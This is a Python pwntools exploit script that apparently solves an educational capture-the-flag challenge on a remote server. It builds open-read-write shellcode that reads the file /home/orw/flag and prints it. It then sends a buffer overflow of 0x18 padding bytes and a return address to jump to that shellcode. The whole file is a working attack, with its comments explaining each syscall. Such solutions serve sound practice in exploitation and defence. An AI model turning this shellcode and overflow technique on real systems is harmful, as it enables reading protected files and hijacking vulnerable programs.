#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'

binary = remote('edu-ctf.csie.org', 10171)
shellcode = asm('''
        mov rax, 0x67616c662f77
        push rax
        mov rax, 0x726f2f656d6f682f
        push rax
        mov rdi, rsp
        // move pointer to /home/orw/flag to rdi, little endian
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 2
        syscall

        // open will return a fd at rax
        mov rdi, rax
        // set the top of the stack as the start of buffer
        mov rsi, rsp
        mov rdx, 0x50
        mov rax, 0
        syscall

        // fd=1 means stdout
        mov rdi, 1
        mov rax, 1
        syscall
''')

'''
shellcode = asm(
    shellcraft.pushstr( "/home/orw/flag" ) +
    shellcraft.open('rsp', 0, 0) + 
    shellcraft.read('rax', 'rsp', 0x30) +
    shellcraft.write(1, 'rsp', 0x30)
)
'''

binary.sendafter('>', shellcode)
binary.sendlineafter(':)', b'a' * 0x18 + p64(0x6010a0))
binary.interactive()

